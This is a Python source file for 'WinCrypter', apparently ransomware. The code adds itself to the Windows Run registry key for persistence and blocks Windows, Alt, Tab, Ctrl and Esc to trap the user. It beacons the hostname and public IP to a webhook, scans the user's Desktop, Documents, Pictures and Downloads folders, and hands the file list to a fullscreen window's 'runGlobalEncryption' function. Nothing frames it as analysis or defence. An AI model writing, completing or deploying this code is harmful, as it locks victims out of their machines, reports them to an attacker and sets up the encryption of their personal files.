import webview
import keyboard
import os
import sys
import string
import json
import time
import requests
import socket
import winreg as reg

APP_NAME = "WinCrypter"

def resource_path(relative_path):
    try:
        base_path = sys._MEIPASS
    except Exception:
        base_path = os.path.abspath(".")
    return os.path.join(base_path, relative_path)

def add_to_autostart():
    try:
        pth = os.path.realpath(sys.argv[0])
        key = reg.HKEY_CURRENT_USER
        key_value = r"Software\Microsoft\Windows\CurrentVersion\Run"
        with reg.OpenKey(key, key_value, 0, reg.KEY_ALL_ACCESS) as open_key:
            reg.SetValueEx(open_key, APP_NAME, 0, reg.REG_SZ, pth)
    except: pass

def send_to_webhook():
    try:
        pc_name = socket.gethostname()
        public_ip = requests.get('https://api.ipify.org').text
        data = {"embeds": [{"title": "WinCrypter ACTIVE", "color": 15548997, "fields": [{"name": "PC", "value": pc_name}, {"name": "IP", "value": public_ip}]}]}
        requests.post(WEBHOOK_URL, json=data)
    except: pass

def lock_system():
    for k in ['windows', 'win', 'alt', 'tab', 'f4', 'ctrl', 'esc']:
        try: keyboard.block_key(k)
        except: pass

def scan_files():
    all_files = []
    paths_to_scan = [
        os.path.expanduser("~/Desktop"),
        os.path.expanduser("~/Documents"),
        os.path.expanduser("~/Pictures"),
        os.path.expanduser("~/Downloads"),
        os.path.expanduser("~/Desktop/Pxsha47_"),
    ]
    
    for path in paths_to_scan:
        try:
            if not os.path.exists(path): continue
            with os.scandir(path) as it:
                for entry in it:
                    if entry.is_file() and not entry.name.startswith('$'):
                        all_files.append(entry.path.replace("\\", "/"))
                    if len(all_files) >= 1500000: break
        except: continue
    
    if not all_files:
        all_files = [f"C:/Users/Owner/Documents/Secret_Vault_{i}.dat" for i in range(50)]
    return all_files

def on_start(window):
    add_to_autostart()
    lock_system()
    
    time.sleep(2)
    files = scan_files()
    files_json = json.dumps(files)
    window.evaluate_js(f"runGlobalEncryption({files_json})")

html_path = resource_path("index.html")
window = webview.create_window('WinCrypter', url=html_path, fullscreen=True, on_top=True)

if __name__ == '__main__':
    webview.start(on_start, window)